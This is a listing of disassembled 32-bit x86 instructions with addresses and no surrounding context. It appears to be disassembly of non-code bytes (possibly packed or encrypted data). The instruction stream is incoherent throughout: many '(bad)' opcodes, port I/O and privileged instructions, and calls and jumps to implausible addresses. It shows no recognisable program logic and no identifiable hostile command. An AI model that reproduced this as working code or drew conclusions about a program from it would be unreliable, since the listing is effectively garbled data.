  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
